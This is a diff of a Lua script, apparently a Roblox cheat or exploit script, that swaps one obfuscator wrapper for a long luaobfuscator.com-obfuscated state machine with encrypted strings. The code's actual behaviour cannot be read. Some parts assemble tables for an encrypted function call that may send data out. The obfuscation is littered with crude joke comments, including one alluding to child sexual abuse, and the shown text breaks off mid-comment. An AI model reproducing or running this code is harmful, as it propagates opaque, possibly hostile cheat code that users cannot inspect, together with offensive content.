@@ -1,9 +1,723 @@
 --[[
-  _____             ______                   _             
- |  __ \           |  ____|                 | |            
- | |  | | _____   _| |__ _   _ ___  ___ __ _| |_ ___  _ __ 
- | |  | |/ _ \ \ / /  __| | | / __|/ __/ _` | __/ _ \| '__|
- | |__| |  __/\ V /| |  | |_| \__ \ (_| (_| | || (_) | |   
- |_____/ \___| \_/ |_|   \__,_|___/\___\__,_|\__\___/|_|   
-]]
-('This Script Is Protected By DevFuscator | dariandev.com/discord'):gsub('.+',function(DevFuscator)Obfuscator=DevFuscator;end);return(function(...)--[[Obfuscated with luaobfuscator.com]]local n,i do local F=math.floor local A=math.random local q=table.remove local L=string.char local z=0 local t=2 local a={}local N={}local C=0 local s={}for i=1,256,1 do s[i]=i--[[Aztupbrew aka skiddware ðŸ™Œ]] end repeat local i=A(1,#s)local n=q(s,i)N[n]=L(n-1)until#s==0 local m={}local function K()--[[hey psst you the wrapper function is right there]]if#m==0 then z=(z*221+33948457532287)%35184372088832 repeat t=(t*27)%257--[[the person who made this script ip grabbed a gorilla]] until t~=1 local i=t%32 local n=(F(z/2^(13-(t-i)/32))%4294967296)/2^i local A=F((n%1)*4294967296)+F(n)local q=A%65536 local L=(A-q)/65536 local a=q%256 local N=(q-a)/256 local C=L%256 local s=(L-C)/256 m={a,N,C,s}--[[hey psst you the wrapper function is right there]]end return table.remove(m)--[[who the fuck uses mee6]]end local J={}n=setmetatable({},{__index=J,__metatable=nil})function i(n,F)--[[https://soundcloud.com/shieldenergy]]local A=J if A[F]then --[[real moonsec v4!11ðŸ˜²ðŸ¤¯]]else m={}local i=N z=F%35184372088832 t=F%255+2 local q=string.len(n)A[F]=""local L=253 for q=1,q,1 do L=((string.byte(n,q)+K())+L)%256 A[F]=A[F]..i[L+1]--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]]end--[[My uncle tickles me]] end return F--[[(xA, qt, Sz) ha i broke ur regex]] end--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] end return(function(F,q,L,z,t,a,N,B,u,c,P,p,A,J,K,C,s,V,e,l,m)--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]]V,J,c,e,l,C,p,m,u,B,K,A,P,s=function(i)--[[hey psst you the wrapper function is right there]]local n,F=1,i[1]while F do s[F],n=s[F]-1,n+1 if s[F]==0 then s[F],C[F]=nil,nil--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] end F=i[n]--[[hey psst you the wrapper function is right there]]end--[[free source code: dariandev.com/discord]] end,function(F)--[[mee6 what are you doing to my wife]]for i=1,#F,1 do s[F[i]]=s[F[i]]+1--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] end if L then local A=L(true)local q=t(A)q[n[i("\247\105\213\055\127\145\037",19659739023237)]],q[n[i("\014\184\222\216",15379673495539)]],q[n[i("\054\182\181\104\149",35076994629531)]]=F,V,function()--[[who the fuck uses mee6]]return 2229956--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] end return A--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] else return z({},{[n[i("\224\041\199\078",15452690167863)]]=V,[n[i("\005\078\092\044\155\203\100",4490525347926)]]=F;[n[i("\005\n\082\n\027",13213870141458)]]=function()--[[hey psst you the wrapper function is right there]]return 2229956--[[Aztupbrew aka skiddware ðŸ™Œ]] end})--[[hey psst you the wrapper function is right there]]end--[[devfuscator free no virus 2021]] end,function(i,n)--[[free source code: dariandev.com/discord]]local F=J(n)local q=function(q,L,z,t)--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]]return A(i,{q,L,z,t},n,F)--[[Please do not the skid. ]]end return q--[[hey psst you the wrapper function is right there]] end,function(i,n)--[[free source code: dariandev.com/discord]]local F=J(n)local q=function(q,L,z,t,a)--[[Evon is not a bitcoin miner real]]return A(i,{q;L;z;t,a},n,F)--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]]end return q--[[Aztupbrew aka skiddware ðŸ™Œ]] end,function(i,n)--[[hey psst you the wrapper function is right there]]local F=J(n)local q=function(q)--[[Override certified boronide fork]]return A(i,{q},n,F)--[[im telling my mommy ðŸ˜¤]]end return q--[[hey psst you the wrapper function is right there]] end,{},function(i,n)--[[My uncle tickles me]]local F=J(n)local q=function(q,L,z)--[[mee6 what are you doing to my wife]]return A(i,{q,L;z},n,F)--[[hey psst you the wrapper function is right there]]end return q--[[who the fuck uses mee6]] end,function()--[[free source code: dariandev.com/discord]]K=1+K s[K]=1 return K--[[Aztupbrew aka skiddware ðŸ™Œ]] end,function(i,n)--[[who the fuck uses mee6]]local F=J(n)local q=function(...)--[[rubi was here]]return A(i,{...},n,F)--[[what am i doing with my life? making lego hacks]]end return q--[[devfuscator free no virus 2021]] end,function(i,n)--[[devfuscator free no virus 2021]]local F=J(n)local q=function(q,L)--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]]return A(i,{q;L},n,F)--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]]end return q--[[hey psst you the wrapper function is right there]] end,0,function(A,L,z,t)--[[Please do not the skid. ]]local Vn={}local xR,Fn,pR,nR,Y,mR,gR,I,sn,lR,x,X,vR,y,hR,j,qR,SR,YR,h,an,ER,M,T,cR,g,rR,FR,zR,LR,H,OR,RR,CR,E,WR,R,AR,MR,GR,Nn,NR,tR,aR,V,uR,Kn,k,r,tn,VR,yR,D,DR,zn,O,jR,Cn,dR,JR,bR,qn,UR,kR,Jn,f,J,mn,W,N,iR,ZR,w,KR,d,QR,b,o,S,K,Q,U,An,Ln,TR,XR,eR,s,IR,G,v,BR,fR,Z,nn,PR,oR,sR,HR,wR while A do if A<9081259 then if A<4806816 then if A<2267870 then if A<1081281 then if A<334094 then if A<148858 then if A<95863 then if A<2973 then v=l(4135550,{o})H={v()}N={q(H)}A=F[n[i("\166\117\159\103\191\246\213\r\167\059\161\031",4062089285319)]]--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]]else Q=Q+D R=not G h=Q<=r h=R and h R=Q>=r R=G and R h=R or h R=11385180 A=h and R h=3891318 A=A or h--[[who the fuck uses mee6]] end--[[devfuscator free no virus 2021]] else if A<114598 then xR=23424 KR=23379 sR=C[J]mR=sR(KR)JR=23482 uR=23422 sR=C[J]KR=sR(JR)sR=C[J]VR=23365 JR=sR(VR)XR=n[i("\114\209\144\166",23740082476637)]VR=C[J]PR=VR(uR)eR=n[i("\093\172\242\081",16536128732200)]pR=F[eR]kR=23477 eR=C[J]lR=eR(xR)cR=pR[lR]pR=C[J]fR=23385 lR=23392 eR=pR(lR)UR=23468 BR=cR[eR]cR=C[J]lR=23413 eR=23420 pR=cR(eR)uR=BR[pR]pR=23351 BR=C[J]cR=BR(pR)A=13043086 VR=uR..cR uR=23426 sR=PR..VR VR=C[J]PR=VR(uR)VR=10181046 cR=23345 xR=23335 uR=C[J]BR=uR(cR)hR=23491 pR=C[J]eR=pR(lR)pR=C[J]lR=pR(xR)pR=C[J]xR=pR(fR)fR=C[J]yR=fR(kR)MR=C[J]oR=MR(UR)UR=23371 kR=iR[oR]MR=C[J]oR=MR(UR)fR=kR..oR pR=yR..fR cR={[eR]=lR;[xR]=pR}xR=23413 fR=23415 eR=C[J]yR=23385 kR=23406 lR=eR(xR)eR=C[J]xR=eR(fR)eR=C[J]oR=23435 fR=eR(yR)eR=C[J]yR=eR(kR)pR={[lR]=xR,[fR]=yR}kR=23385 fR=23413 lR=C[J]xR=lR(fR)lR=C[J]yR=23386 fR=lR(yR)lR=C[J]yR=lR(kR)kR=C[J]MR=kR(oR)UR=F[XR]XR=C[J]bR=XR(hR)oR=UR[bR]bR=23458 UR=C[J]XR=UR(bR)kR=oR..XR lR=MR..kR eR={[xR]=fR,[yR]=lR}uR={cR,pR;eR}cR=C[J]xR=23466 eR=23338 pR=cR(eR)eR=C[J]lR=eR(xR)yR=23393 xR=C[J]fR=xR(yR)MR=23432 yR=C[J]kR=yR(MR)xR=NR..kR eR=fR..xR cR={[lR]=eR}LR={[mR]=KR;[JR]=sR,[PR]=VR;[BR]=uR;[pR]=cR}mR=n[i("\038\222\241\142\243\214\019\215\251\225\138\204\195\085\058\037",25857565974033)]sR=F[mR]mR=sR(CR,LR)LR=nil--[[Mitochondria is the powerhouse of the cell]] else A=9716521 g=n[i("\158\050",9808930907055)]v=F[g]g=n[i("\215\144",9130305364279)]F[g]=v--[[Mitochondria is the powerhouse of the cell]] end--[[hey psst you the wrapper function is right there]] end--[[(xA, qt, Sz) ha i broke ur regex]] else if A<249244 then if A<241843 then T=nil Z=nil A=2843222--[[what am i doing with my life? making lego hacks]] else nR=65536 iR=S%nR nR=256 T=iR/nR w={b(T)}g={U(q(w))}O=y(Z,q(g))A=11767655--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] end--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] else if A<254233 then N=n[i("\209\037\064\r",3336217660451)]s={a(1,q(L))}J=23479 A=F[N]N=n[i("\077\249\021\155\131\113\167\059\060\226",32097270133956)]K=C[z[1]]x={K(J)}N=A[N]N=N(A,q(x))x=n[i("\002\116\067\068\172\176\215\083",798888297192)]K=N N=F[x]J=C[z[2]]x={N(J)}N=n[i("\094\047\133\v\173\062\218\026\127\093",31844933104601)]N=K[N]A={N(K,q(x))}N={q(A)}A=F[n[i("\201\083\130\164\057\066\172\040\209\069\104\121\245",14460522443931)]]--[[https://soundcloud.com/shieldenergy]]else A=C[z[3]]N=A()A=C[z[4]]N={A()}N={q(N)}A=F[n[i("\105\047\055\189\138\168\153\061\003\200\138\105\198",19379483854464)]]--[[whats a jmesðŸ¤”]]end--[[Aztupbrew aka skiddware ðŸ™Œ]] end--[[Please do not the skid. ]] end--[[https://soundcloud.com/shieldenergy]] else if A<733758 then if A<621150 then if A<512410 then T=n[i("\175\172\166\231\129",10859082459009)]aR=23459 CR=23402 Z=F[T]zR=C[J]A=7127257 NR=23500 tR=zR(aR)zR=C[J]aR=zR(NR)zR=C[J]NR={zR(CR)}LR={tR;aR,q(NR)}zR={Z(LR)}T=zR[1]iR=zR[2]nR=zR[3]--[[the person who made this script ip grabbed a gorilla]]else T=A aR=23391 zR=n[i("\200\080\059\163",19484713764578)]LR=F[zR]zR=C[J]tR=zR(aR)nR=LR[tR]LR=7449423635 iR=nR==LR A=iR and 6342849 or 14121391 Z=iR--[[Mitochondria is the powerhouse of the cell]] end--[[hey psst you the wrapper function is right there]] else if A<717415 then N=n[i("\121\139\t\056\061",21513073970755)]A=F[N]s=C[z[1]]N=A(s)N={}A=F[n[i("\253 \084\224\246\103\251\155\133\232\159\124\198\227",18006126150017)]]--[[Override certified boronide fork]]else Z=nil LR=nil A=7127257--[[(xA, qt, Sz) ha i broke ur regex]] end--[[what am i doing with my life? making lego hacks]] end--[[Aztupbrew aka skiddware ðŸ™Œ]] else if A<857501 then if A<767097 then T=n[i("\006\242\068\236",25799582146011)]A=8484099 w=F[T]T=C[J]nR=23424 iR=T(nR)g=w[iR]iR=23387 w=C[J]T=w(iR)Z=g[T]g=n[i("\236\052\209\159",13196689747970)]g=Z[g]g=g(Z)G=g--[[Obfuscated with luaobfuscator.com]] else VR=23365 sR=C[J]KR=23379 JR=23482 mR=sR(KR)sR=C[J]uR=23422 KR=sR(JR)sR=C[J]JR=sR(VR)eR=n[i("\241\064\025\155",28481871079325)]VR=C[J]PR=VR(uR)pR=F[eR]xR=23424 eR=C[J]lR=eR(xR)xR=23335 cR=pR[lR]lR=23392 pR=C[J]eR=pR(lR)BR=cR[eR]kR=23477 fR=23385 UR=23468 cR=C[J]lR=23413 eR=23420 pR=cR(eR)uR=BR[pR]BR=C[J]pR=23351 cR=BR(pR)VR=uR..cR uR=23426 cR=23345 sR=PR..VR VR=C[J]PR=VR(uR)uR=C[J]VR=10181046 BR=uR(cR)pR=C[J]eR=pR(lR)pR=C[J]lR=pR(xR)pR=C[J]xR=pR(fR)fR=C[J]yR=fR(kR)MR=C[J]oR=MR(UR)kR=iR[oR]UR=23371 MR=C[J]oR=MR(UR)fR=kR..oR pR=yR..fR oR=23435 cR={[eR]=lR,[xR]=pR}fR=23415 eR=C[J]kR=23410 xR=23413 lR=eR(xR)eR=C[J]yR=23385 xR=eR(fR)eR=C[J]fR=eR(yR)XR=n[i("\093\092\241\188",3170856373129)]eR=C[J]yR=eR(kR)kR=23385 hR=23491 pR={[lR]=xR,[fR]=yR}fR=23413 lR=C[J]xR=lR(fR)yR=23386 lR=C[J]fR=lR(yR)lR=C[J]yR=lR(kR)kR=C[J]MR=kR(oR)UR=F[XR]XR=C[J]bR=XR(hR)oR=UR[bR]UR=C[J]bR=23458 XR=UR(bR)kR=oR..XR A=13043086 lR=MR..kR eR={[xR]=fR,[yR]=lR}yR=23393 uR={cR,pR;eR}cR=C[J]eR=23338 pR=cR(eR)MR=23432 xR=23466 eR=C[J]lR=eR(xR)xR=C[J]fR=xR(yR)yR=C[J]kR=yR(MR)xR=NR..kR eR=fR..xR cR={[lR]=eR}LR={[mR]=KR;[JR]=sR;[PR]=VR;[BR]=uR;[pR]=cR}mR=n[i("\079\r\251\236\"\109\171\043\241\117\196\229\240\046\116\230",199722074298)]sR=F[mR]mR=sR(CR,LR)LR=nil--[[the person who made this script ip grabbed a gorilla]] end--[[what am i doing with my life? making lego hacks]] else if A<1070600 then CR=C[J]A=12701572 mR=23501 sR={CR(mR)}NR=n[i("\225\016\077\207\216\027\002\025\152\250\231\082\115\065\117\086\223\229\165\169\023",33734776388281)]NR=h[NR]NR=NR(h,q(sR))tR=NR--[[Obfuscated with luaobfuscator.com]] else K={a(2,q(L))}s=m()C[s]=L[1]f=23468 x=C[s]J=C[z[1]]V=J(f)N=x[V]V=23440 x=C[z[1]]J=x(V)A=N==J A=A and 13856167 or 12853129--[[hey psst you the wrapper function is right there]] end--[[mee6 what are you doing to my wife]] end--[[My uncle tickles me]] end--[[mee6 what are you doing to my wife]] end--[[Override certified boronide fork]] else if A<1835077 then if A<1339251 then if A<1172571 then if A<1098284 then A=true A=13023118--[[My uncle tickles me]] else A=13353368 Q=n[i("\075\162\169\103",20535939091125)]h=F[Q]Q=h()--[[My uncle tickles me]]end--[[(xA, qt, Sz) ha i broke ur regex]] else if A<1263147 then LR=n[i("\204\181\205\214",216902467786)]nR=F[LR]LR=n[i("\107\255\080\080\180\138\199\242\128\042",3467218160797)]aR=23324 zR=C[J]tR={zR(aR)}LR=nR[LR]LR=LR(nR,q(tR))nR=C[J]tR=23331 zR=nR(tR)iR=LR[zR]A=4489353 tR=23442 LR=C[J]zR={LR(tR)}nR=n[i("\246\205\095\075\244\042\226\133\221\166\240\112\212\040",17147106475617)]nR=iR[nR]nR=nR(iR,q(zR))Z=nR--[[Override certified boronide fork]] else aR=23426 nR=23379 tR=23427 LR=23401 T=C[J]CR=23345 VR=23385 pR=23505 JR=23382 xR=23491 zR=23365 iR=T(nR)T=C[J]nR=T(LR)T=C[J]KR=23413 PR=23433 BR=23477 LR=T(zR)T=C[J]zR=T(tR)T=C[J]tR=T(aR)T=10181046 aR=C[J]A=15056332 eR=n[i("\109\151\018\055",20632578804495)]NR=aR(CR)sR=C[J]mR=sR(KR)sR=C[J]KR=sR(JR)sR=C[J]JR=sR(VR)sR=C[J]VR=sR(PR)CR={[mR]=KR;[JR]=VR}mR=C[J]JR=23413 KR=mR(JR)PR=23385 VR=23354 mR=C[J]JR=mR(VR)mR=C[J]VR=mR(PR)PR=C[J]uR=PR(BR)BR=C[J]cR=BR(pR)PR=Q..cR mR=uR..PR sR={[KR]=JR,[VR]=mR}uR=23385 cR=23435 KR=C[J]PR=23386 VR=23413 JR=KR(VR)KR=C[J]VR=KR(PR)KR=C[J]PR=KR(uR)uR=C[J]BR=uR(cR)pR=F[eR]eR=C[J]lR=eR(xR)cR=pR[lR]lR=23458 pR=C[J]eR=pR(lR)uR=cR..eR KR=BR..uR mR={[JR]=VR;[PR]=KR}JR=23466 aR={CR,sR,mR}mR=23338 CR=C[J]sR=CR(mR)BR=23432 mR=C[J]KR=mR(JR)PR=23393 JR=C[J]VR=JR(PR)PR=C[J]uR=PR(BR)JR=R..uR mR=VR..JR CR={[KR]=mR}Z={[iR]=nR,[LR]=zR;[tR]=T;[NR]=aR,[sR]=CR}iR=n[i("\159\071\154\017\244\109\235\171\111\217\111\065\133\081\087\079",7153486338566)]T=F[iR]iR=T(w,Z)Z=nil--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] end--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] end--[[rubi was here]] else if A<1415808 then if A<1358545 then g=6 v=C[X]I=1 H=v(I,g)v=n[i("\215\101",34441320070475)]F[v]=H g=n[i("\114\249",5890727417198)]I=F[g]g=2 v=I>g A=v and 9241370 or 128515--[[mee6 what are you doing to my wife]] else Q=n[i("\171\186\033\114",13158033862622)]r=.5 w=23364 Z=23461 h=F[Q]Q=h(r)NR=23424 G=23329 r=n[i("\114\031\155\066",34623861751285)]Q=F[r]r=C[J]D=r(G)iR=23480 G=23430 h=Q[D]g=23447 r=C[J]D=r(G)Q=n[i("\095\055 \024\138\016\162",11458248681903)]G=C[J]R=G(Z)tR=n[i("\067\168\121\079",24727955102197)]G=C[J]Z=G(g)G=C[J]g=G(w)w=C[J]T=w(iR)zR=F[tR]tR=C[J]aR=tR(NR)LR=zR[aR]aR=23392 zR=C[J]tR=zR(aR)nR=LR[tR]tR=23420 LR=C[J]zR=LR(tR)iR=nR[zR]zR=23480 nR=C[J]Q=h[Q]LR=nR(zR)w=iR..LR iR=23438 zR=23462 nR=n[i("\129\023\052\070",3975113543286)]G=T..w w=C[J]T=w(iR)iR=F[nR]nR=C[J]LR=nR(zR)w=iR[LR]r={[R]=Z;[g]=G;[T]=w}w=23364 Q=Q(h,D,r)G=23329 Q=n[i("\111\052\003\047",18115651158503)]h=F[Q]r=.5 nR=n[i("\183\177\161\110",4918961410533)]Q=h(r)r=n[i("\239\044\085\091",3138643135339)]Q=F[r]r=C[J]D=r(G)Z=23461 h=Q[D]G=23430 r=C[J]D=r(G)g=23451 G=C[J]R=G(Z)aR=23391 G=C[J]Q=n[i("\101\075\150\193\242\247\129",11274633226500)]Z=G(g)iR=23438 T=23504 G=C[J]g=G(w)G=C[J]w=G(T)G=C[J]zR=23462 T=G(iR)iR=F[nR]Q=h[Q]nR=C[J]LR=nR(zR)G=iR[LR]r={[R]=Z;[g]=w,[T]=G}Z=23461 Q=Q(h,D,r)w=23364 Q=n[i("\029\018\074\031",8154244259242)]h=F[Q]r=.5 nR=n[i("\223\027\235\b",22975554966421)]Q=h(r)r=n[i("\225\153\072\053",18056593555888)]G=23329 Q=F[r]r=C[J]D=r(G)g=23405 h=Q[D]G=23430 r=C[J]D=r(G)G=C[J]R=G(Z)G=C[J]Z=G(g)iR=23438 G=C[J]T=23380 g=G(w)G=C[J]zR=23462 w=G(T)G=C[J]T=G(iR)iR=F[nR]nR=C[J]Q=n[i("\001\136\100\202\081\147\134",10305014769021)]LR=nR(zR)G=iR[LR]r={[R]=Z;[g]=w;[T]=G}R=23372 zR=n[i("\091\028\237\t",6234335286958)]Q=h[Q]Q=Q(h,D,r)Q=n[i("\103\214\226\227",15531075713152)]r=.1 h=F[Q]Q=h(r)Q=n[i("\112\233\061\162\085\145\237\157\027\062\193",22346323054923)]h=u(10153782,{J})Z=23384 F[Q]=h Q=n[i("\164\135\164\177\161\144\130\152\027\028\244\197\110\178\081\170",13422182412500)]r=.1 D=n[i("\140\248",28149000955495)]h=u(3310181,{J})F[Q]=h Q=n[i("\029\182\074\113",5317331784536)]h=F[Q]Q=h(r)Q=n[i("\110\176\057\049\038\153\172\002\217\138\176\030\124\137\057\240",1365841282296)]h=u(9439520,{J})F[Q]=h h=25200 r=F[D]D=C[J]G=D(R)Q=r[G]r=Q()G=n[i("\152\025",27059119743600)]g=23464 iR=23414 T=23373 D=F[G]G=C[J]R=G(Z)Q=D[R]G=C[J]Z=23457 R=G(Z)G=r+h D=Q(R,G)LR=23407 nR=23368 R=n[i("\174\242\026\216\221\248",8782402396147)]G=F[R]R=C[J]Z=R(g)Q=G[Z]g=23328 R=C[J]Z=R(g)g=C[J]w=g(T)R=D[w]w=C[J]T=w(iR)g=D[T]T=C[J]iR=T(nR)w=D[iR]G=Q(Z,R,g,w)Z=n[i("\174\246\150\225\084\225",26068025794261)]R=F[Z]w=23464 Z=C[J]g=Z(w)Q=R[g]w=23460 Z=C[J]iR=23489 nR=23325 g=Z(w)w=C[J]T=w(iR)Z=D[T]T=C[J]iR=T(nR)w=D[iR]iR=C[J]nR=iR(LR)T=D[nR]iR=23424 R=Q(g,Z,w,T)g=n[i("\118\n\018\127",4501263093856)]Z=F[g]w=C[J]T={w(iR)}w=23495 g=n[i("\n\253\239\157\169\165\202\203\183\119",31849228202973)]g=Z[g]g=g(Z,q(T))Z=n[i("\122\171\111\246~\146\040\037\218\b",24461659003133)]Z=g[Z]Z=Z(g)Q=#Z Z=C[J]g=Z(w)T=23450 Z=C[J]w=Z(T)LR=F[zR]T=A zR=C[J]tR=zR(aR)nR=LR[tR]LR=7449423635 iR=nR==LR Z=iR A=iR and 1220645 or 4489353--[[free source code: dariandev.com/discord]] end--[[the person who made this script ip grabbed a gorilla]] else if A<1671262 then x=u(250375,{z[1];z[2]})s={a(1,q(L))}N=n[i("\220\146\176\073\108",22820931425029)]A=F[N]J={A(x)}N=J[1]K=J[2]x=N A=x and 14340534 or 263688--[[hey psst you the wrapper function is right there]] else s={a(1,q(L))}J=23388 N=C[z[1]]K=C[z[2]]x=K(J)A=N[x]A=A and 12973452 or 14515643--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] end--[[free source code: dariandev.com/discord]] end--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] end--[[Evon is not a bitcoin miner real]] else if A<2163460 then if A<1956265 then if A<1876947 then A=14515643--[[https://soundcloud.com/shieldenergy]] else x,f=J(K,x)A=x and 6199997 or 13356440--[[My uncle tickles me]] end--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] else if A<2133721 then A=u(11659620,{z[1];z[2],z[3]})s={a(1,q(L))}K=A J=n[i("\117\113\'-\178\215\210",8838238674983)]x=F[J]J=x()f=23419 x=C[z[1]]V=x(f)N=J[V]A=not N A=A and 6113978 or 5352611--[[rubi was here]] else A=8931601--[[who the fuck uses mee6]] end--[[Mitochondria is the powerhouse of the cell]] end--[[who the fuck uses mee6]] else if A<2230376 then if A<2212775 then r=3 Q=m()D=65 C[Q]=h A=C[X]h=A(r,D)r=m()A=0 R=n[i("\103\037\232\164\t",9004673736898)]C[r]=h h=A W=c(13432730,{J})A=0 I=23445 D=A G=F[R]R={G(W)}A={q(R)}R=2 W=n[i("\012\215\041\190\123\024\136\091",24706479610337)]v=n[i("\113\170\001\215\029\004\085\000",27733450188004)]G=A A=G[R]R=A A=F[W]Z=C[y]S=F[v]v=S(R)S=C[J]H={S(I)}j=Z(v,q(H))Z={j()}W=A(q(Z))Z=m()A=14985162 C[Z]=W W=1 j=C[r]S=j j=1 v=j j=0 H=v<j j=W-v--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] else A=8032501 U=f--[[(xA, qt, Sz) ha i broke ur regex]] end--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] else if A<2247991 then T=n[i("\109\171\018\089",11866283027243)]nR=23424 D=A w=F[T]T=C[J]R=A iR=T(nR)g=w[iR]iR=23392 w=C[J]T=w(iR)Z=g[T]A=Z and 7277278 or 14755267 G=Z--[[Mitochondria is the powerhouse of the cell]] else A=D h=r A=8605959--[[https://soundcloud.com/shieldenergy]] end--[[mee6 what are you doing to my wife]] end--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] end--[[mee6 what are you doing to my wife]] end--[[rubi was here]] end--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] else if A<3631176 then if A<2833710 then if A<2341467 then if A<2284915 then if A<2268874 then H=nil A=14650303 g=1 I=nil O=j+g j=O--[[who the fuck uses mee6]] else LR=1 nR=n[i("\015\114\050\026",18437783536403)]iR=F[nR]nR=iR(LR)nR=A zR=A CR=23501 aR=C[J]tR=n[i("\122\162\030\051\074\240\217\176\176\145\198\245\060\222\079\163\222\140\090\099\118",6889337788688)]tR=h[tR]NR={aR(CR)}tR=tR(h,q(NR))LR=tR A=tR and 12981644 or 8749323--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] end--[[Please do not the skid. ]] else if A<2305542 then T=P(T)w=P(w)W=P(W)nR=nil iR=P(iR)g=P(g)I=P(I)A=14985162--[[Override certified boronide fork]] else A=N and 13922217 or 8845582--[[devfuscator free no virus 2021]] end--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] end--[[https://soundcloud.com/shieldenergy]] else if A<2783455 then if A<2528657 then A=Z A=R and 5000344 or 3783795--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] else N=C[z[1]]x=23323 s=L[1]K=s-x A=N[K]N={A}A=F[n[i("\086\030\096\121\161\145\252\180\'\026\200\105",27535875662892)]]--[[https://soundcloud.com/shieldenergy]]end--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] else if A<2821784 then sR=C[J]NR=A CR=n[i("\247\021\036",28874872580363)]CR=T[CR]KR=23355 mR={sR(KR)}CR=CR(T,q(mR))aR=CR A=CR and 11833705 or 7940850--[[rubi was here]] else zR=n[i("\067\042\185\016",35055519137671)]T=A LR=F[zR]zR=C[J]aR=23391 tR=zR(aR)nR=LR[tR]LR=7449423635 iR=nR==LR A=iR and 12194164 or 7537382 Z=iR--[[devfuscator free no virus 2021]] end--[[https://soundcloud.com/shieldenergy]] end--[[hey psst you the wrapper function is right there]] end--[[mee6 what are you doing to my wife]] else if A<3283424 then if A<3200658 then if A<3066156 then w,T=D(g,w)A=w and 13602207 or 12824968--[[who the fuck uses mee6]] else s=n[i("\058\101\163\177\033",1570932229559)]A=F[s]x=0 K=C[z[9]]s=A(K,x)A=6651083--[[Obfuscated with luaobfuscator.com]] end--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] else if A<3206769 then tR=23474 LR=C[J]zR=LR(tR)nR=T[zR]zR=n[i("\175\117\028\242\003\002\a\004\051",11938225924974)]LR=F[zR]iR=nR~=LR A=iR and 2275909 or 4129406--[[who the fuck uses mee6]] else LR=u(6893266,{Q;J})zR=LR()iR=zR A=7026902--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] end--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] end--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] else if A<3411015 then if A<3313348 then N=n[i("\172\249\176\246",4921108959719)]K=L[2]A=F[N]J=C[z[1]]s=L[1]f=23479 x={a(3,q(L))}k=23379 N=n[i("\198\015\a\200\078\205\098\194\162\134",6130179151437)]V={J(f)}N=A[N]N=N(A,q(V))J=N N=C[z[1]]f=23375 y=23390 V=N(f)X=23379 N=C[z[1]]h=23365 f=N(y)N=C[z[1]]A={[V]=f}V=A W=23466 G=23345 y=23499 f=N(y)U=C[z[1]]S=23338 o=U(k)k=C[z[1]]M=k(X)U=K[M]k=C[z[1]]X=23365 M=k(X)X=C[z[1]]r=23426 b=X(h)k=K[b]h=23426 X=C[z[1]]b=X(h)h=C[z[1]]Q=h(r)r=23345 X=K[Q]h=C[z[1]]Q=h(r)r=C[z[1]]D=r(G)G=23338 h=K[D]r=C[z[1]]D=r(G)G=C[z[1]]R=G(W)Z=C[z[1]]j=Z(S)S=23466 W=K[j]Z=C[z[1]]j=Z(S)G=W[j]r={[R]=G}y={[o]=U;[M]=k,[b]=X;[Q]=h;[D]=r}K=nil N={y}A={[f]=N}f=A b=23470 A=n[i("\206\087\253\158\118-\242\023\109\194",27929950938523)]A=J[A]N=n[i("\016\043\217\116\203\250\184",6152728417890)]A=A(J,f)h=23357 y=A A=F[N]o=C[z[1]]M=23476 J=nil k=o(M)o=C[z[1]]f=nil X=23456 M=o(X)o=C[z[1]]X=o(b)o=C[z[1]]b=o(h)o=C[z[1]]Q=23475 h=o(Q)U={[k]=s,[M]=X,[b]=V;[h]=y}s=nil V=nil N=A(U)U=N U=nil N=n[i("\002\211\063\102\161",20727070968679)]A=F[N]o=C[z[1]]y=nil M=23446 k={o(M)}N=A(q(k))N={}A=F[n[i("\186\095\198\190\'\122\121\055\220\022\044\060\175\152",12089628142587)]]--[[https://soundcloud.com/shieldenergy]]else A=true A=A and 6613194 or 14271412--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] end--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] else if A<3599679 then N={}A=F[n[i("\199\197\052\252\241\232\219\115\170\201\101\241\187",20417823885895)]]--[[free source code: dariandev.com/discord]]else r=C[z[2]]Q=r[M]h=not Q b=h A=h and 15309780 or 5533865--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] end--[[Override certified boronide fork]] end--[[(xA, qt, Sz) ha i broke ur regex]] end--[[devfuscator free no virus 2021]] end--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] else if A<4202430 then if A<3877596 then if A<3773849 then if A<3729676 then s=n[i("\167\131",13877462839932)]N=n[i("\n\106",28312214693631)]A=F[N]N=F[s]s=n[i("\151\180",8460270018247)]F[s]=A s=n[i("\037\020",26777790800234)]F[s]=N s=C[z[1]]A=14754243 K=s()--[[hey psst you the wrapper function is right there]]else v=true A=v and 1348137 or 5925557--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] end--[[devfuscator free no virus 2021]] else if A<3858193 then G=nil h=nil A=11892075--[[Evon is 